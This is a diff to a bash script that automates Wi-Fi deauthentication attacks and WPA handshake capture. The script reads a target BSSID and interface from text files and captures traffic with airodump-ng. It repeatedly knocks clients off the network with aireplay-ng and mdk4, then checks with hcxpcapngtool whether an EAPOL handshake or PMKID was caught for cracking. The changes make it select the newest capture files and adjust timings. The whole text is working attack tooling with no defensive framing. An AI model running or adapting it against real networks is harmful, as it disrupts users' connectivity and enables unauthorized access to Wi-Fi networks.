@@ -79,7 +79,8 @@ echo "example: nearby -> 1m, almost distant -> 10m, very distant -> 30m"
 echo " " && sleep 2
 qterminal -e 'nano attacktime.txt'
 echo " "
-mkdir "hands-$(sed 's/://g' macadress.txt)"
+mkdir "hands-$(sed 's/://g' macadress.txt)" || echo "(the folder already exists...)"
+echo " "
 
 # grep $(cat macadress.txt) $(ls -1 /root/airlog-0[0-9].csv | tail -1) | awk '{print $6}' | sed 's/,//g'
 # grep $(cat macadress.txt) $(ls -1 /root/airlog-0[0-9].csv | tail -1) | cut -d ',' -f 4 | sed 's/[ ]//g'
@@ -87,27 +88,31 @@ mkdir "hands-$(sed 's/://g' macadress.txt)"
 
 # airmon-ng check kill
 
+sleep 3
+
 xterm -geometry '85x25+403+0' -e 'airodump-ng -c $(grep $(cat macadress.txt) $(ls -1 /root/airlog-0[0-9].csv | tail -1) | cut -d "," -f 4 | sed "s/[ ]//g;1!d") --bssid $(cat macadress.txt) -w hands-$(sed "s/://g" macadress.txt)/$(sed "s/://g" macadress.txt) $(cat interface.txt)' &
 
 echo "aireplay attack ready after time -> $(cat attacktime.txt) !!!"
 echo " "
-xterm -geometry '65x25+0+0' -e 'sleep $(cat attacktime.txt) && aireplay-ng -0 10 -a $(cat macadress.txt) -c $(grep "Client" hands-$(sed "s/://g" macadress.txt)/$(sed "s/://g" macadress.txt)-01.log.csv | cut -d "," -f 4 | perl -ne "print if ++\$k{\$_}==1" | tail -1) $(cat interface.txt)'
+xterm -geometry '65x25+0+0' -e 'sleep $(cat attacktime.txt) && aireplay-ng -0 10 -a $(cat macadress.txt) -c $(grep "Client" $(ls -1 hands-$(sed "s/://g" macadress.txt)/$(sed "s/://g" macadress.txt)-0[0-9].log.csv | tail -1) | cut -d "," -f 4 | perl -ne "print if ++\$k{\$_}==1" | tail -1) $(cat interface.txt)'
 
-echo "again aireplay attack ready after time -> 10s, and check handshake !!!" && sleep 9
+echo "again aireplay attack ready after time -> 10s, and check handshake !!!" && sleep 11
 echo " "
 # ***************** Check Handshake (1) *************************************************
-CHECK1="$(hcxpcapngtool hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-01.cap | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p' | wc -l | sed 's/[12]/CATCH/g')"
-# CHECK1="$(echo -e $(tshark -r hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-01.cap -R 'eapol' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/CATCH/g;s/[1]/0/g')\n$(tshark -r hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-01.cap -R 'eapol && wlan.rsn.ie.pmkid' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/CATCH/') | sort -u)"
+CHECK1="$(hcxpcapngtool $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p' | wc -l | sed 's/[12]/CATCH/g')"
+# CHECK1="$(echo -e $(tshark -r $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) -R 'eapol' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/CATCH/g;s/[1]/0/g')\n$(tshark -r $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) -R 'eapol && wlan.rsn.ie.pmkid' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/CATCH/') | sort -u)"
 
 if [ "$CHECK1" = "CATCH" ]; then
 # CATCH value => yes ---
 echo "Captured handshake !!! :-)"
 
 echo " "
-hcxpcapngtool "hands-$(sed 's/://g' macadress.txt)"/"$(sed 's/://g' macadress.txt)-01.cap" | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p'
-# tshark -r "hands-$(sed 's/://g' macadress.txt)"/"$(sed 's/://g' macadress.txt)-01.cap" -R "eapol" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/EAPOL -> yes/g;s/[01]//g'
-# tshark -r "hands-$(sed 's/://g' macadress.txt)"/"$(sed 's/://g' macadress.txt)-01.cap" -R "eapol && wlan.rsn.ie.pmkid" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/PMKID -> yes/g;s/0//g'
+hcxpcapngtool "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p'
+# tshark -r "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" -R "eapol" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/EAPOL -> yes/g;s/[01]//g'
+# tshark -r "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" -R "eapol && wlan.rsn.ie.pmkid" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/PMKID -> yes/g;s/0//g'
 echo " "
+echo "File to use -> $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) !!!"
+
 rm /root/airlog-*
 kill "$(ps aux | grep 'airodump-ng' | sed -n '1p' | awk '{print $2}')"
 exit
@@ -119,22 +124,24 @@ fi
 echo " "
 echo "continues attack process..."
 # ***************************************************************************************
-xterm -geometry '65x25+0+0' -e 'sleep 1 && aireplay-ng -0 10 -a $(cat macadress.txt) -c $(grep "Client" hands-$(sed "s/://g" macadress.txt)/$(sed "s/://g" macadress.txt)-01.log.csv | cut -d "," -f 4 | perl -ne "print if ++\$k{\$_}==1" | tail -1) $(cat interface.txt)'
+xterm -geometry '65x25+0+0' -e 'sleep 1 && aireplay-ng -0 10 -a $(cat macadress.txt) -c $(grep "Client" $(ls -1 hands-$(sed "s/://g" macadress.txt)/$(sed "s/://g" macadress.txt)-0[0-9].log.csv | tail -1) | cut -d "," -f 4 | perl -ne "print if ++\$k{\$_}==1" | tail -1) $(cat interface.txt)'
 echo " "
-echo "mdk4 attack ready after time -> 10s, and check handshake !!!" && sleep 10
+echo "mdk4 attack ready after time -> 10s, and check handshake !!!" && sleep 11
 echo " "
 # ***************** Check Handshake (2) *************************************************
-CHECK2="$(hcxpcapngtool hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-01.cap | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p' | wc -l | sed 's/[12]/CATCH/g')"
-# CHECK2="$(echo -e $(tshark -r hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-01.cap -R 'eapol' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/CATCH/g;s/[1]/0/g')\n$(tshark -r hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-01.cap -R 'eapol && wlan.rsn.ie.pmkid' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/CATCH/') | sort -u)"
+CHECK2="$(hcxpcapngtool $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p' | wc -l | sed 's/[12]/CATCH/g')"
+# CHECK2="$(echo -e $(tshark -r $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) -R 'eapol' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/CATCH/g;s/[1]/0/g')\n$(tshark -r $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) -R 'eapol && wlan.rsn.ie.pmkid' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/CATCH/') | sort -u)"
 
 if [ "$CHECK2" = "CATCH" ]; then
 # CATCH value => yes ---
 echo "Captured handshake !!! :-)"
 
 echo " "
-hcxpcapngtool "hands-$(sed 's/://g' macadress.txt)"/"$(sed 's/://g' macadress.txt)-01.cap" | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p'
-# tshark -r "hands-$(sed 's/://g' macadress.txt)"/"$(sed 's/://g' macadress.txt)-01.cap" -R "eapol" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/EAPOL -> yes/g;s/[01]//g'
-# tshark -r "hands-$(sed 's/://g' macadress.txt)"/"$(sed 's/://g' macadress.txt)-01.cap" -R "eapol && wlan.rsn.ie.pmkid" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/PMKID -> yes/g;s/0//g'
+hcxpcapngtool "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p'
+# tshark -r "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" -R "eapol" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/EAPOL -> yes/g;s/[01]//g'
+# tshark -r "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" -R "eapol && wlan.rsn.ie.pmkid" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/PMKID -> yes/g;s/0//g'
+echo " "
+echo "File to use -> $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) !!!"
 
 rm /root/airlog-*
 kill "$(ps aux | grep 'airodump-ng' | sed -n '1p' | awk '{print $2}')"
@@ -149,20 +156,22 @@ echo "continues attack process..."
 # ***************************************************************************************
 timeout 30s xterm -geometry '65x25+0+0' -e 'sleep 1 && mdk4 $(cat interface.txt) d -b macadress.txt -c $(grep $(cat macadress.txt) $(ls -1 /root/airlog-0[0-9].csv | tail -1) | cut -d "," -f 4 | sed "s/[ ]//g;1!d")'
 echo " "
-echo "again mdk4 attack ready after time -> 10s, and check handshake !!!" && sleep 10
+echo "again mdk4 attack ready after time -> 10s, and check handshake !!!" && sleep 12
 echo " "
 # ***************** Check Handshake (3) *************************************************
-CHECK3="$(hcxpcapngtool hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-01.cap | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p' | wc -l | sed 's/[12]/CATCH/g')"
-# CHECK3="$(echo -e $(tshark -r hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-01.cap -R 'eapol' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/CATCH/g;s/[1]/0/g')\n$(tshark -r hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-01.cap -R 'eapol && wlan.rsn.ie.pmkid' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/CATCH/') | sort -u)"
+CHECK3="$(hcxpcapngtool $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p' | wc -l | sed 's/[12]/CATCH/g')"
+# CHECK3="$(echo -e $(tshark -r $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) -R 'eapol' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/CATCH/g;s/[1]/0/g')\n$(tshark -r $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) -R 'eapol && wlan.rsn.ie.pmkid' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/CATCH/') | sort -u)"
 
 if [ "$CHECK3" = "CATCH" ]; then
 # CATCH value => yes ---
 echo "Captured handshake !!! :-)"
 
 echo " "
-hcxpcapngtool "hands-$(sed 's/://g' macadress.txt)"/"$(sed 's/://g' macadress.txt)-01.cap" | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p'
-# tshark -r "hands-$(sed 's/://g' macadress.txt)"/"$(sed 's/://g' macadress.txt)-01.cap" -R "eapol" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/EAPOL -> yes/g;s/[01]//g'
-# tshark -r "hands-$(sed 's/://g' macadress.txt)"/"$(sed 's/://g' macadress.txt)-01.cap" -R "eapol && wlan.rsn.ie.pmkid" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/PMKID -> yes/g;s/0//g'
+hcxpcapngtool "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p'
+# tshark -r "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" -R "eapol" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/EAPOL -> yes/g;s/[01]//g'
+# tshark -r "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" -R "eapol && wlan.rsn.ie.pmkid" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/PMKID -> yes/g;s/0//g'
+echo " "
+echo "File to use -> $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) !!!"
 
 rm /root/airlog-*
 kill "$(ps aux | grep 'airodump-ng' | sed -n '1p' | awk '{print $2}')"
@@ -182,20 +191,22 @@ echo " "
 echo "Last chance: FINAL ATTACK METHOD - REVERSE CLIENT SELECTION (tail intead -> head)"
 echo " "
 
-echo "aireplay attack ready after time -> 10s and check handshake !!!" && sleep 9
+echo "aireplay attack ready after time -> 10s and check handshake !!!" && sleep 15
 echo " "
 # ***************** Check Handshake (4) *************************************************
-CHECK4="$(hcxpcapngtool hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-01.cap | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p' | wc -l | sed 's/[12]/CATCH/g')"
-# CHECK4="$(echo -e $(tshark -r hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-01.cap -R 'eapol' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/CATCH/g;s/[1]/0/g')\n$(tshark -r hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-01.cap -R 'eapol && wlan.rsn.ie.pmkid' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/CATCH/') | sort -u)"
+CHECK4="$(hcxpcapngtool $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p' | wc -l | sed 's/[12]/CATCH/g')"
+# CHECK4="$(echo -e $(tshark -r $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) -R 'eapol' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/CATCH/g;s/[1]/0/g')\n$(tshark -r $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) -R 'eapol && wlan.rsn.ie.pmkid' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/CATCH/') | sort -u)"
 
 if [ "$CHECK4" = "CATCH" ]; then
 # CATCH value => yes ---
 echo "Captured handshake !!! :-)"
 
 echo " "
-hcxpcapngtool "hands-$(sed 's/://g' macadress.txt)"/"$(sed 's/://g' macadress.txt)-01.cap" | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p'
-# tshark -r "hands-$(sed 's/://g' macadress.txt)"/"$(sed 's/://g' macadress.txt)-01.cap" -R "eapol" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/EAPOL -> yes/g;s/[01]//g'
-# tshark -r "hands-$(sed 's/://g' macadress.txt)"/"$(sed 's/://g' macadress.txt)-01.cap" -R "eapol && wlan.rsn.ie.pmkid" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/PMKID -> yes/g;s/0//g'
+hcxpcapngtool "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p'
+# tshark -r "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" -R "eapol" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/EAPOL -> yes/g;s/[01]//g'
+# tshark -r "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" -R "eapol && wlan.rsn.ie.pmkid" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/PMKID -> yes/g;s/0//g'
+echo " "
+echo "File to use -> $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) !!!"
 
 rm /root/airlog-*
 kill "$(ps aux | grep 'airodump-ng' | sed -n '1p' | awk '{print $2}')"
@@ -209,23 +220,25 @@ echo " "
 echo "continues attack process..."
 # ***************************************************************************************
 
-xterm -geometry '65x25+0+0' -e 'sleep 1 && aireplay-ng -0 10 -a $(cat macadress.txt) -c $(grep "Client" hands-$(sed "s/://g" macadress.txt)/$(sed "s/://g" macadress.txt)-01.log.csv | cut -d "," -f 4 | perl -ne "print if ++\$k{\$_}==1" | head -1) $(cat interface.txt)'
+xterm -geometry '65x25+0+0' -e 'sleep 1 && aireplay-ng -0 10 -a $(cat macadress.txt) -c $(grep "Client" $(ls -1 hands-$(sed "s/://g" macadress.txt)/$(sed "s/://g" macadress.txt)-0[0-9].log.csv | tail -1) | cut -d "," -f 4 | perl -ne "print if ++\$k{\$_}==1" | head -1) $(cat interface.txt)'
 echo " "
-echo "again aireplay attack ready after time -> 10s, and check handshake !!!" && sleep 9
+echo "again aireplay attack ready after time -> 10s, and check handshake !!!" && sleep 12
 echo " "
 # ***************** Check Handshake (5) *************************************************
-CHECK5="$(hcxpcapngtool hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-01.cap | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p' | wc -l | sed 's/[12]/CATCH/g')"
-# CHECK1="$(echo -e $(tshark -r hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-01.cap -R 'eapol' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/CATCH/g;s/[1]/0/g')\n$(tshark -r hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-01.cap -R 'eapol && wlan.rsn.ie.pmkid' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/CATCH/') | sort -u)"
+CHECK5="$(hcxpcapngtool $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p' | wc -l | sed 's/[12]/CATCH/g')"
+# CHECK5="$(echo -e $(tshark -r $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) -R 'eapol' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/CATCH/g;s/[1]/0/g')\n$(tshark -r $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) -R 'eapol && wlan.rsn.ie.pmkid' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/CATCH/') | sort -u)"
 
 if [ "$CHECK5" = "CATCH" ]; then
 # CATCH value => yes ---
 echo "Captured handshake !!! :-)"
 
 echo " "
-hcxpcapngtool "hands-$(sed 's/://g' macadress.txt)"/"$(sed 's/://g' macadress.txt)-01.cap" | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p'
-# tshark -r "hands-$(sed 's/://g' macadress.txt)"/"$(sed 's/://g' macadress.txt)-01.cap" -R "eapol" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/EAPOL -> yes/g;s/[01]//g'
-# tshark -r "hands-$(sed 's/://g' macadress.txt)"/"$(sed 's/://g' macadress.txt)-01.cap" -R "eapol && wlan.rsn.ie.pmkid" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/PMKID -> yes/g;s/0//g'
+hcxpcapngtool "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p'
+# tshark -r "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" -R "eapol" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/EAPOL -> yes/g;s/[01]//g'
+# tshark -r "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" -R "eapol && wlan.rsn.ie.pmkid" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/PMKID -> yes/g;s/0//g'
 echo " "
+echo "File to use -> $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) !!!"
+
 rm /root/airlog-*
 kill "$(ps aux | grep 'airodump-ng' | sed -n '1p' | awk '{print $2}')"
 exit
@@ -237,22 +250,24 @@ fi
 echo " "
 echo "continues attack process..."
 # ***************************************************************************************
-xterm -geometry '65x25+0+0' -e 'sleep 1 && aireplay-ng -0 10 -a $(cat macadress.txt) -c $(grep "Client" hands-$(sed "s/://g" macadress.txt)/$(sed "s/://g" macadress.txt)-01.log.csv | cut -d "," -f 4 | perl -ne "print if ++\$k{\$_}==1" | head -1) $(cat interface.txt)'
+xterm -geometry '65x25+0+0' -e 'sleep 1 && aireplay-ng -0 10 -a $(cat macadress.txt) -c $(grep "Client" $(ls -1 hands-$(sed "s/://g" macadress.txt)/$(sed "s/://g" macadress.txt)-0[0-9].log.csv | tail -1) | cut -d "," -f 4 | perl -ne "print if ++\$k{\$_}==1" | head -1) $(cat interface.txt)'
 echo " "
-echo "mdk4 attack ready after time -> 10s, and check handshake !!!" && sleep 10
+echo "mdk4 attack ready after time -> 10s, and check handshake !!!" && sleep 12
 echo " "
 # ***************** Check Handshake (6) *************************************************
-CHECK6="$(hcxpcapngtool hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-01.cap | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p' | wc -l | sed 's/[12]/CATCH/g')"
-# CHECK2="$(echo -e $(tshark -r hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-01.cap -R 'eapol' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/CATCH/g;s/[1]/0/g')\n$(tshark -r hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-01.cap -R 'eapol && wlan.rsn.ie.pmkid' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/CATCH/') | sort -u)"
+CHECK6="$(hcxpcapngtool $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p' | wc -l | sed 's/[12]/CATCH/g')"
+# CHECK6="$(echo -e $(tshark -r $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) -R 'eapol' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/CATCH/g;s/[1]/0/g')\n$(tshark -r $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) -R 'eapol && wlan.rsn.ie.pmkid' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/CATCH/') | sort -u)"
 
 if [ "$CHECK6" = "CATCH" ]; then
 # CATCH value => yes ---
 echo "Captured handshake !!! :-)"
 
 echo " "
-hcxpcapngtool "hands-$(sed 's/://g' macadress.txt)"/"$(sed 's/://g' macadress.txt)-01.cap" | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p'
-# tshark -r "hands-$(sed 's/://g' macadress.txt)"/"$(sed 's/://g' macadress.txt)-01.cap" -R "eapol" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/EAPOL -> yes/g;s/[01]//g'
-# tshark -r "hands-$(sed 's/://g' macadress.txt)"/"$(sed 's/://g' macadress.txt)-01.cap" -R "eapol && wlan.rsn.ie.pmkid" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/PMKID -> yes/g;s/0//g'
+hcxpcapngtool "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p'
+# tshark -r "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" -R "eapol" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/EAPOL -> yes/g;s/[01]//g'
+# tshark -r "$(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1)" -R "eapol && wlan.rsn.ie.pmkid" -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/PMKID -> yes/g;s/0//g'
+echo " "
+echo "File to use -> $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) !!!"
 
 rm /root/airlog-*
 kill "$(ps aux | grep 'airodump-ng' | sed -n '1p' | awk '{print $2}')"
@@ -267,20 +282,22 @@ echo "continues attack process..."
 # ***************************************************************************************
 timeout 30s xterm -geometry '65x25+0+0' -e 'sleep 1 && mdk4 $(cat interface.txt) d -b macadress.txt -c $(grep $(cat macadress.txt) $(ls -1 /root/airlog-0[0-9].csv | tail -1) | cut -d "," -f 4 | sed "s/[ ]//g;1!d")'
 echo " "
-echo "again mdk4 attack ready after time -> 10s, and check handshake !!!" && sleep 10
+echo "again mdk4 attack ready after time -> 10s, and check handshake !!!" && sleep 14
 echo " "
 # ***************** Check Handshake (7) *************************************************
-CHECK7="$(hcxpcapngtool hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-01.cap | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p' | wc -l | sed 's/[12]/CATCH/g')"
-# CHECK3="$(echo -e $(tshark -r hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-01.cap -R 'eapol' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/CATCH/g;s/[1]/0/g')\n$(tshark -r hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-01.cap -R 'eapol && wlan.rsn.ie.pmkid' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/CATCH/') | sort -u)"
+CHECK7="$(hcxpcapngtool $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p' | wc -l | sed 's/[12]/CATCH/g')"
+# CHECK7="$(echo -e $(tshark -r $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) -R 'eapol' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/[234]/CATCH/g;s/[1]/0/g')\n$(tshark -r $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) -R 'eapol && wlan.rsn.ie.pmkid' -2 | sed 's/.*(Message \(.*\) of 4)/\1/' | sort -u | wc -l | sed 's/1/CATCH/') | sort -u)"
 
 if [ "$CHECK7" = "CATCH" ]; then
 # CATCH value => yes ---
 echo "Captured handshake !!! :-)"
 
